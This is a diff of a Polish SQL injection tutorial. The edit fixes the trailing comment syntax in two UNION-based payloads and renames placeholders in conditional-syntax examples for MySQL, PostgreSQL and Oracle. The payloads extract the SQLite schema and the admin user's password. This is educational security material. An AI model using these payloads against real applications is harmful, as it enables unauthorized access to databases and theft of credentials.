@@ -55,14 +55,14 @@ SELECT sql from sqlite_master;
 ```
 które w tym przypadku przybierze formę
 ```sql
-admin' UNION SELECT sql from sqlite_master; --'
+admin' UNION SELECT sql from sqlite_master; --
 ```
 
 ![Aplikacja PHP - kolumny]({{ data.site_url }}/assets/images/web/sqlinjection/php_app_columns.png)
 
 Jako, że `UNION` wymaga takiej samej ilości kolumn w wyniku obu zapytań, dane z bazy będzie można wyciągać tylko pojedyńczo. Przykładowo hasło użytkownika `admin` pozyskamy stosując polecenie
 ```sql
-admin' UNION SELECT password from users WHERE user_name = 'admin'; --'
+admin' UNION SELECT password from users WHERE user_name = 'admin'; --
 ```
 
 ![Aplikacja PHP - haslo]({{ data.site_url }}/assets/images/web/sqlinjection/php_app_password.png)
@@ -80,15 +80,15 @@ admin' UNION SELECT password from users WHERE user_name = 'admin'; --'
 
 #### MySQL
 
-- `IF(warunek, wykonaj-jesli-prawda, wykonaj-jeśli-fałsz)`
+- `IF(warunek, wykonaj_jesli_prawda, wykonaj_jeśli_fałsz)`
 
 #### PostgreSQL
 
-- `SELECT CASE WHEN warunek THEN wykonaj-jesli-prawda ELSE wykonaj-jeśli-fałsz END;`
+- `SELECT CASE WHEN warunek THEN wykonaj_jesli_prawda ELSE wykonaj_jeśli_fałsz END;`
 
 #### Oracle
 
-- `BEGIN IF warunek THEN wykonaj-jesli-prawda; ELSE wykonaj-jeśli-fałsz; END IF; END;`
+- `BEGIN IF warunek THEN wykonaj_jesli_prawda; ELSE wykonaj_jeśli_fałsz; END IF; END;`
 
 ### Liczby szesnastkowe
 
